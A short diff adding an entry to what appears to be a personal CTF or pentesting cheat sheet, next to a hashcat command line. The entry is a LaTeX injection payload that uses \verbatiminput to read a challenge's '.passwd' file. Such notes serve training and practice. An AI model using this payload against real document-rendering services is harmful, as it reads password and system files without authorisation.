@@ -4373,5 +4373,25 @@ hashcat -a 0 -m 3200 (hash) (wordlist)
 
 ---------------------
 
+### Reading more than a single line with latex injection
+
+---------------------
+
+- /verbatiminput-:
+
+```latex
+\documentclass{article}
+\usepackage{verbatim}
+
+\begin{document}
+
+\verbatiminput{/challenge/app-script/ch23/.passwd}
+
+\end{document}
+}
+```
+
+-----------------------
+
 
 
